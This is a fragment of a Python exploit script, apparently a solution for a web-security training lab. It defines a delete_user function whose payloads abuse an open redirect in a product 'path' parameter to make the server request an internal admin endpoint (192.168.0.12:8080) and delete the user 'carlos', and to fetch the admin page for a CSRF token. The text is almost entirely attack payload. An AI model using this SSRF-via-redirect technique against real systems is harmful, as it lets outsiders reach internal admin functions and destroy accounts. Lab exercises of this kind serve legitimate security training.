...
def delete_user(url, admin_ip_address):
    delete_user_url_ssrf_payload ='/product/nextProduct?currentProductId=1&path=https://192.168.0.12:8080/admin/delete?username=carlos'
    ...
    admin_csrf_payload = '/product/nextProduct?currentProductId=1&path=https://192.168.0.12:8080/admin/'
